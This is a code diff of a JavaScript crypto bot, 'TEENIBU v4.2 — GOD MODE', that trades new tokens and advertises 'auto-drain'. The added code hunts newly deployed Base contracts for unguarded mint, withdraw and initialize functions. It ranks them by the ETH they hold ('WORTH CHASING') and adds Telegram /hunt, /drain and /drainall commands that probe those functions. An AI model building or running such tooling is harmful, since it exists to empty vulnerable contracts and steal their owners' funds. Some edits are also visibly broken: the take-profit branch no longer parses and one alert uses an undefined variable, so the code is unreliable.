@@ -1,6 +1,6 @@
 // ═══════════════════════════════════════════════════════════════════
-//  TEENIBU v4.1 — GOD MODE
-//  find → market score → security probe → verdict → auto-buy → manage → sell
+//  TEENIBU v4.2 — GOD MODE
+//  pool hunt + contract hunt + loot check → verdict → auto-buy → manage → sell
 //  + auto-drain | Base EVM + Solana scan | serverless | DRY unless armed
 // ═══════════════════════════════════════════════════════════════════
 import fs from 'node:fs';
@@ -32,18 +32,20 @@ const ERC20_ABI = [
 
 // ── TUNING ─────────────────────────────────────────────────────────
 const CFG = {
-  minLiq: 8000, maxFdv: 900_000, minTx: 15, maxAgeH: 24, patience: 2, pages: 3,
-  marketMin: 55, securityMin: 50, strongMarket: 70, strongSecurity: 65,
+  minLiq: 3500, maxFdv: 900_000, minTx: 8, maxAgeH: 48, patience: 1, pages: 3,
+  marketMin: 45, securityMin: 45, strongMarket: 62, strongSecurity: 58,
   tradeEth: 0.0004,
   slippage: 0.18,
   gasReserve: 0.00008,
   maxPositions: 1,
   tp1: 2.0, tp2: 4.0, trailArm: 3.0, trailPct: 0.30, stopLoss: 0.60, timeExitH: 4,
   drainMinLoot: 0.0002, drainGasMult: 3,
-  maxAlertsPerRun: 3, maxAlertsPerDay: 10, maxUpdates: 15,
+  lootWorth: 0.0003,          // ETH held to mark a contract "worth chasing"
+  maxAlertsPerRun: 3, maxAlertsPerDay: 12, maxUpdates: 15,
 };
 const LIVE = () => S.live;
 const AUTO = () => S.auto;
+const WORTH = parseEther(String(CFG.lootWorth));
 
 // ── WALLET ─────────────────────────────────────────────────────────
 const vBase = defineChain({ id: 8453, name: 'Base', nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 }, rpcUrls: { default: { http: [CHAINS.base.rpc] } } });
@@ -61,7 +63,7 @@ const sleep = ms => new Promise(r => setTimeout(r, ms));
 const randAddr = () => '0x' + [...crypto.getRandomValues(new Uint8Array(20))].map(b => b.toString(16).padStart(2, '0')).join('');
 const deadline = () => Math.floor(now() / 1000) + 600;
 
-let S = { offset: 0, seen: {}, watch: {}, targets: {}, positions: {}, paused: false, authed: false, live: false, auto: false, alertsToday: 0, day: today() };
+let S = { offset: 0, seen: {}, seenDev: {}, watch: {}, targets: {}, positions: {}, paused: false, authed: false, live: false, auto: false, alertsToday: 0, day: today() };
 let M = { outcomes: [], deployers: {}, stats: {}, classBump: {}, drained: [] };
 const BASE_W = {
   unguarded_mint: 1.2, unguarded_pause: 0.7, unguarded_withdraw: 1.5, unguarded_initialize: 1.6,
@@ -77,13 +79,13 @@ function load() {
     S = { ...S, ...(d.S || {}) };
     M = { ...M, ...(d.M || {}) };
   } catch {}
-  S.seen = S.seen || {};
-  M.stats = M.stats || {};
-  M.classBump = M.classBump || {};
+  S.seen = S.seen || {}; S.seenDev = S.seenDev || {};
+  M.stats = M.stats || {}; M.classBump = M.classBump || {};
   if (S.day !== today()) { S.day = today(); S.alertsToday = 0; }
   S.alertsToday = S.alertsToday || 0;
   const cut = now() - 14 * DAY;
   for (const k of Object.keys(S.seen)) if ((S.seen[k] || 0) < cut) delete S.seen[k];
+  for (const k of Object.keys(S.seenDev)) if ((S.seenDev[k] || 0) < cut) delete S.seenDev[k];
 }
 const save = () => {
   try {
@@ -120,6 +122,14 @@ const getBal = async a => { const r = await rpc('eth_getBalance', [a, 'latest'])
 const EIP1967 = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
 const ZERO32 = '0x' + '0'.repeat(64), ZERO20 = '0x' + '0'.repeat(40);
 
+// ── LOOT LINE ──────────────────────────────────────────────────────
+async function lootLine(addr) {
+  const loot = await getBal(addr);
+  if (loot === 0n) return '💰 holds 0 ETH';
+  const eth = formatEther(loot);
+  return loot >= WORTH ? `💰💰 HOLDS ${eth} ETH — WORTH CHASING` : `💰 holds ${eth} ETH (below ${CFG.lootWorth})`;
+}
+
 // ── ANALYSIS ───────────────────────────────────────────────────────
 function analyzeBytecode(code) {
   const c = (code || '').slice(2).toLowerCase();
@@ -137,18 +147,13 @@ function analyzeBytecode(code) {
     if (op === 0xff) out.selfdestruct = true;
     if (op === 0xf4) out.delegatecall = true;
     if (op === 0x32) out.txorigin = true;
-    if (op === 0x14) {
-      for (const p of pushes) if (i - p.at < 40) out.selectors.push('0x' + p.v);
-      pushes = [];
-    }
+    if (op === 0x14) { for (const p of pushes) if (i - p.at < 40) out.selectors.push('0x' + p.v); pushes = []; }
     i += 2;
   }
   out.selectors = [...new Set(out.selectors)];
   return out;
 }
-
 const abiType = (t) => t.type.startsWith('tuple') ? `(${t.components.map(abiType).join(',')})${t.type.slice(5)}` : t.type;
-
 async function abiSelectors(addr) {
   if (!BS_KEY) return null;
   const j = await jget(`${CHAINS.base.scan}?module=contract&action=getabi&address=${addr}&apikey=${BS_KEY}`);
@@ -158,14 +163,11 @@ async function abiSelectors(addr) {
       .map(f => keccak256(toHex(`${f.name}(${(f.inputs || []).map(abiType).join(',')})`)).slice(0, 10));
   } catch { return null; }
 }
-
 async function amountsOut(amountIn, path) {
   const r = await call(ROUTER, encodeFunctionData({ abi: ROUTER_ABI, functionName: 'getAmountsOut', args: [amountIn, path] }));
   if (!r.ok) return null;
   try {
-    const d = r.data.slice(2);
-    const n = parseInt(d.slice(64, 128), 16);
-    if (!n) return null;
+    const d = r.data.slice(2); const n = parseInt(d.slice(64, 128), 16); if (!n) return null;
     const start = 128 + (n - 1) * 64;
     return BigInt('0x' + d.slice(start, start + 64));
   } catch { return null; }
@@ -181,8 +183,7 @@ async function securityScan(addr) {
   f.selectors = abi || a.selectors;
   if (a.txorigin) f.findings.push('txorigin_auth');
   const meta = await jget(`${CHAINS.base.scan}?module=contract&action=getsourcecode&address=${addr}&apikey=${BS_KEY}`);
-  if (meta?.result?.[0] && !meta.result[0].SourceCode) f.findings.push('unverified');
-  else f.verified = true;
+  if (meta?.result?.[0] && !meta.result[0].SourceCode) f.findings.push('unverified'); else f.verified = true;
   const slot = await getSlot(addr, EIP1967);
   if (slot && slot !== ZERO32 && BigInt(slot) !== 0n) { const impl = '0x' + slot.slice(-40); const ic = await getCode(impl); if (ic && ic !== '0x') f.findings.push('upgradeable_proxy'); }
   const gp = await jget(`https://api.gopluslabs.io/api/v1/token_security/8453?contract_addresses=${addr}`);
@@ -201,7 +202,6 @@ async function securityScan(addr) {
   }
   return f;
 }
-
 function securityScore(findings, extra = {}) {
   if (findings.includes('no_code')) return { score: 0, hits: ['no_code — not a contract'] };
   if (findings.includes('rpc_error')) return { score: -1, hits: ['rpc_error — retry'] };
@@ -214,13 +214,11 @@ function securityScore(findings, extra = {}) {
   if (findings.includes('unguarded_mint')) s = Math.min(s, 50);
   return { score: Math.max(0, Math.min(100, Math.round(s))), hits };
 }
-
 function marketScore(t) { let s = 0;
   s += t.liq > 30000 ? 25 : t.liq > 15000 ? 15 : 8;
   s += t.fdv < 150000 ? 25 : t.fdv < 400000 ? 15 : 6;
   s += t.tx > 300 ? 25 : t.tx > 100 ? 15 : 6;
   s += (t.ageH > 1 && t.ageH < 12) ? 25 : 12; return Math.min(100, s); }
-
 function verdict(mk, sc) {
   if (sc < 35) return 'TRAP';
   if (mk >= CFG.strongMarket && sc >= CFG.strongSecurity) return 'STRONG';
@@ -228,7 +226,7 @@ function verdict(mk, sc) {
   return 'WATCH';
 }
 
-// ── SOLANA SCAN ────────────────────────────────────────────────────
+// ── SOLANA ─────────────────────────────────────────────────────────
 async function scanSVM(addr) {
   const [g, r] = await Promise.all([
     jget(`https://api.gopluslabs.io/api/v1/solana/token_security?contract_addresses=${addr}`),
@@ -251,7 +249,6 @@ async function sendTx(to, data, value = 0n) {
   if (!acct) return 'NO_KEY'; if (!LIVE()) return 'DRY';
   try { return await wal.sendTransaction({ to, data, value }); } catch (e) { return 'FAIL:' + e.message.slice(0, 40); }
 }
-
 async function buyToken(addr, name, score) {
   if (!acct) return 'no key';
   if (Object.keys(S.positions).length >= CFG.maxPositions) return 'max positions';
@@ -268,7 +265,6 @@ async function buyToken(addr, name, score) {
   await sendTx(addr, ap);
   return h;
 }
-
 async function sellToken(addr, pct) {
   const p = S.positions[addr]; if (!p || !acct) return 'none';
   const amt = p.amount * BigInt(Math.round(pct * 100)) / 100n; if (amt <= 0n) return 'dust';
@@ -292,7 +288,7 @@ async function manage() {
     if (m <= CFG.stopLoss) act = ['STOP-LOSS', 1.0];
     else if (p.peak >= CFG.trailArm && m <= p.peak * (1 - CFG.trailPct)) act = ['TRAIL', 1.0];
     else if (m >= CFG.tp2 && !p.took25) { act = ['TP2', 0.25]; p.took25 = true; }
-    else if (m >= CFG.tp1 && !p.took50) { act = ['TP1', 0.50]; p.took50 = true; }
+    else if (m >= CFG.tp1 && !p.took50) act = ['TP1', 0.50]; p.took50 = true;
     else if (now() - p.ts > CFG.timeExitH * 3600e3 && p.peak < 1.3) act = ['TIME-EXIT', 1.0];
     if (act) {
       const h = await sellToken(addr, act[1]);
@@ -325,6 +321,44 @@ async function drainHunt() {
   }
 }
 
+// ── CONTRACT DEPLOYMENT HUNTER ─────────────────────────────────────
+async function huntDeployments() {
+  if (S.paused) return 0;
+  const bn = await rpc('eth_blockNumber', []);
+  if (!bn.ok) return 0;
+  const latest = parseInt(bn.data, 16);
+  const addrs = [];
+
+  for (let i = 0; i < 12 && addrs.length < 8; i++) {
+    const b = await rpc('eth_getBlockByNumber', ['0x' + (latest - i).toString(16), true]);
+    if (!b.ok || !b.data?.transactions) continue;
+    for (const tx of b.data.transactions) {
+      if (tx.to !== null) continue;
+      const r = await rpc('eth_getTransactionReceipt', [tx.hash]);
+      const c = r.ok ? r.data?.contractAddress : null;
+      if (c && !S.seenDev[c]) addrs.push(c);
+      if (addrs.length >= 8) break;
+    }
+  }
+
+  let hits = 0;
+  for (const addr of addrs) {
+    S.seenDev[addr] = now();
+    const f = await securityScan(addr);
+    if (!f.unguarded.length) continue;
+    const loot = await getBal(addr);
+    const line = await lootLine(addr);
+    hits++;
+    S.targets[addr] = { t: now(), chain: 'base', mk: 0, sc: 0, verdict: 'DRAINABLE', liq: 0, pair: null };
+    await send(`🩸 NEW CONTRACT ${short(addr)}
+🔓 UNGUARDED: ${[...new Set(f.unguarded)].join(', ')}
+${line}
+${f.findings.filter(x => !x.startsWith('unguarded')).map(x => '⚠ ' + x).join('\n') || 'no other flags'}
+https://basescan.org/address/${addr}`);
+  }
+  return hits;
+}
+
 // ── SOURCER ────────────────────────────────────────────────────────
 async function sourcer() {
   if (S.paused) return 0;
@@ -354,10 +388,14 @@ async function sourcer() {
         S.seen[addr] = now(); delete S.watch[addr];
         if (v === 'WATCH') continue;
 
+        const loot = chain === 'base' ? await lootLine(addr) : null;
         S.targets[addr] = { t: now(), chain, mk, sc: sc.score, verdict: v, liq, entry: +p.attributes.base_token_price_usd || 0, pair: p.attributes.address, maxUp: 1 };
         fired++; S.alertsToday++;
         const tag = v === 'TRAP' ? '🪤' : v === 'STRONG' ? '🔥' : '✅';
-        await send(`${tag} ${v} [${chain}] — ${p.attributes.name}\nMarket ${mk}/100 · Security ${sc.score}/100\nLiq $${Math.round(liq).toLocaleString()} · MCap $${Math.round(fdv).toLocaleString()}\n${sc.hits.length ? '⚠ ' + [...new Set(sc.hits)].join(', ') : 'clean'}\nhttps://dexscreener.com/${chain}/${addr}`);
+        await send(`${tag} ${v} [${chain}] — ${p.attributes.name}
+Market ${mk}/100 · Security ${sc.score}/100
+Liq $${Math.round(liq).toLocaleString()} · MCap $${Math.round(fdv).toLocaleString()}
+${sec.unguarded.length ? '🔓 UNGUARDED: ' + [...new Set(sec.unguarded)].join(', ') + '\n' : ''}${loot ? loot + '\n' : ''}${sc.hits.length ? '⚠ ' + [...new Set(sc.hits)].join(', ') + '\n' : ''}https://dexscreener.com/${chain}/${addr}`);
 
         if (AUTO() && v === 'STRONG' && chain === 'base') {
           const h = await buyToken(addr, p.attributes.name, mk + sc.score);
@@ -370,7 +408,7 @@ async function sourcer() {
 }
 
 function writeOracle() {
-  const o = { v: '4.1', ts: now(), signals: Object.entries(S.targets).map(([a, t]) => ({ addr: a, verdict: t.verdict, mk: t.mk, sc: t.sc })) };
+  const o = { v: '4.2', ts: now(), signals: Object.entries(S.targets).map(([a, t]) => ({ addr: a, verdict: t.verdict, mk: t.mk, sc: t.sc })) };
   try { fs.writeFileSync(ORACLE, JSON.stringify(o, null, 1)); } catch {}
   return o;
 }
@@ -386,7 +424,7 @@ async function handle() {
     if (String(u.message?.chat?.id) !== String(TG_CHAT)) continue;
     const [cmd, a, b] = (u.message.text || '').trim().split(/\s+/);
     try {
-      if (cmd === '/ping') await send(`🧬 Teenibu v4.1 · live=${LIVE() ? 'ON' : 'off'} · auto=${AUTO() ? 'ON' : 'off'}`);
+      if (cmd === '/ping') await send(`🧬 Teenibu v4.2 · live=${LIVE() ? 'ON' : 'off'} · auto=${AUTO() ? 'ON' : 'off'}`);
       else if (cmd === '/auth' && a) { S.authed = a === PIN; await send(S.authed ? '🔓 authed' : '❌ wrong pin'); }
       else if (cmd === '/scan' && a) {
         if (a === 'sol') {
@@ -395,7 +433,7 @@ async function handle() {
           await send(`🧬 SOL ${short(b)}\nSecurity ${s.score}/100 · rugcheck ${f.rug ?? 'n/a'}\n${s.hits.length ? '⚠ ' + s.hits.join(', ') : 'clean'}`);
         } else {
           const f = await securityScan(a); const s = securityScore(f.findings, { verified: f.verified, lpLocked: f.lpLocked });
-          await send(`🧬 ${short(a)}\nSecurity ${s.score}/100\n${f.unguarded.length ? '🔓 UNGUARDED: ' + f.unguarded.join(', ') + '\n' : ''}${s.hits.length ? '⚠ ' + s.hits.join(', ') : 'clean'}`);
+          await send(`🧬 ${short(a)}\nSecurity ${s.score}/100\n${await lootLine(a)}\n${f.unguarded.length ? '🔓 UNGUARDED: ' + f.unguarded.join(', ') + '\n' : ''}${s.hits.length ? '⚠ ' + s.hits.join(', ') : 'clean'}`);
         }
       }
       else if (cmd === '/drain' && a) {
@@ -412,15 +450,16 @@ async function handle() {
           for (const nm of un) {
             const s = map[nm]; if (!s) continue;
             const sim = await call(a, s, acct?.address || randAddr());
-            out.push(`${nm}: ${sim.ok ? '✅ callable' : '❌ reverts'} · holds ${formatEther(await getBal(a))} ETH`);
+            out.push(`${nm}: ${sim.ok ? '✅ callable' : '❌ reverts'}`);
           }
-          await send(`🩸 DRAIN ${short(a)}\n${out.join('\n')}`);
+          await send(`🩸 DRAIN ${short(a)}\n${out.join('\n')}\n${await lootLine(a)}`);
         }
       }
+      else if (cmd === '/hunt') { const n2 = await huntDeployments(); await send(`🔎 deployment hunt — ${n2} unguarded found`); }
       else if (cmd === '/drainall') {
         const t = Object.entries(S.targets).filter(([, x]) => !x.done && x.chain === 'base');
         const out = [];
-        for (const [addr] of t.slice(0, 8)) { const f = await securityScan(addr); if (f.unguarded.length) out.push(`${short(addr)} → ${[...new Set(f.unguarded)].join(',')}`); }
+        for (const [addr] of t.slice(0, 8)) { const f = await securityScan(addr); if (f.unguarded.length) out.push(`${short(addr)} → ${[...new Set(f.unguarded)].join(',')} · ${await lootLine(addr)}`); }
         await send(out.length ? '🩸 TARGETS WITH UNGUARDED\n' + out.join('\n') : 'none');
       }
       else if (cmd === '/stats') await send(`📊 positions ${Object.keys(S.positions).length} · resolved ${M.outcomes.length} · drained ${M.drained.length}`);
@@ -446,7 +485,7 @@ async function handle() {
       }
       else if (cmd === '/pause') { S.paused = true; await send('⏸'); }
       else if (cmd === '/resume') { S.paused = false; await send('▶️'); }
-      else if (cmd === '/help') await send(`🧬 TEENIBU v4.1\n/auth <pin>\n/scan <addr> · /scan sol <mint> · /drain <addr> · /drainall\n/stats · /positions · /bal\n/live on yes · /auto on|off\n/buy <addr> · /sell <addr> [pct] · /sweep <to> confirm\n/pause /resume /ping`);
+      else if (cmd === '/help') await send(`🧬 TEENIBU v4.2\n/auth <pin>\n/scan <addr> · /scan sol <mint>\n/drain <addr> · /drainall · /hunt\n/stats · /positions · /bal\n/live on yes · /auto on|off\n/buy <addr> · /sell <addr> [pct] · /sweep <to> confirm\n/pause /resume /ping`);
     } catch (e) { try { await send('⚠️ ' + String(e?.message || e).slice(0, 200)); } catch {} }
   }
 }
@@ -456,8 +495,8 @@ async function handle() {
   load();
   await handle();
   save();
-  await sourcer(); await manage(); await drainHunt(); writeOracle(); save();
-  const end = Date.now() + 260_000;              // stay awake ~4m20s
+  await sourcer(); await huntDeployments(); await manage(); await drainHunt(); writeOracle(); save();
+  const end = Date.now() + 260_000;
   while (Date.now() < end) {
     const before = S.offset;
     await handle();
